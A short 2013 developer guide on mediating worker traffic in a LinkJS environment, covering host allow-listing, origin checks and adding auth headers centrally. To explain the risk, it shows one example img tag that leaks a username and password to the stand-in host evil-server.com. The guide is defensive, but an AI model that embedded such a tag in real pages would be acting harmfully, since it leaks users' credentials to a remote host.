Mediating Traffic for Security and Privacy
==========================================

2013 pfraze


## Overview

The safety of the user's information relies on smart traffic policies which are enforced by the environment. This document explains how to enforce those policies, and illustrates some tools and common patterns.


## Basics

Traffic mediation is accomplished by the 'request wrapper', which is minimally defined as follows:

```javascript
Environment.request = function(origin, request) {
	// pass the request to Link for fulfillment
	return Link.request(request);
};
```

All worker servers will use this function to issue requests; it's up to the in-document servers whether to use `Environment.request` rather than `Link.request`.


## Common Patterns and Tools

### Link.parse.url

`Link.parse.url` wraps [Stephen Levithan's parseUri](http://stevenlevithan.com/demo/parseuri/js/), a function which breaks a URL into its component pieces. Some common uses for this:

```javascript
var urld = Link.parse.url(request);

// trusted remote hosts
if (/https?/.test(urld.protocol) && urld.host == 'mysite.com') {
	return Link.request(request);
}

// local traffic
if (urld.protocol == 'httpl') {
	return Link.request(request);
}
```

### instanceof origin

You can check the prototype of the request origin to make decisions.

```javascript
if (origin instanceof WorkerServer) {
	// make decisions for user applications
} else {
	// make decisions for (presumably trusted) in-document applications
}
```


## Auth headers

You never want to let credentials leak back into user applications, as they may be able to pass that data out to a remote host.

 > Even a totally isolated worker can reach a remote server! For instance, what happens when they put `<img src="http://evil-server.com/picture.png?user=pfraze&password=foobar" />` in their HTML? Unless you have highly-restrictive [Content Security Policies](https://developer.mozilla.org/en-US/docs/Security/CSP), the data in the query parameters will escape.

For this reason, it is best to add Auth headers to requests in the environment. For instance:

```javascript
Environment.request = function(origin, request) {
	//...
	// add credentials to sessions
	if (MySessionManager.hasSession(origin, request)) {
		Link.headers(request.headers).addAuth(MySessionManager.getSession(origin, request));
	}
	// ...
};
```


## Further Topics

 - [Using LinkJS, the HTTP wrapper](../lib/linkjs.md)
 - [Using the Environment API](lib/environment.md)